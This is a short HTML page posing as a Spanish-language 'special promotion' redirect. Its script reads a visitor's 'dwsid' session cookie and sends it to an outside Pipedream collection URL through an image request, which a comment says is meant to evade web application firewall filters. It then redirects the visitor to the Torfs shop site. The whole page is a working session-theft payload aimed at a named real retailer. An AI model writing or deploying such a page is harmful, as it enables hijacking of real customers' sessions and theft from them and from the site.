<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Promoción especial</title>
</head>
<body>
  <h1>Redirigiendo a la oferta...</h1>
  <script>
    // Captura la cookie dwsid
    const cookie = document.cookie.includes('dwsid=') 
      ? document.cookie.split('dwsid=')[1].split(';')[0] 
      : 'none';

    // Envía a Pipedream usando GET para evadir filtros de WAF
    const url = "https://eoozwutroaqr7ij.m.pipedream.net?dwsid=" + encodeURIComponent(cookie);
    const img = new Image();
    img.src = url;

    // Redirige a torfs.be después de un breve retraso
    setTimeout(() => {
      window.location.href = "https://www.torfs.be";
    }, 1000);
  </script>
</body>
</html>
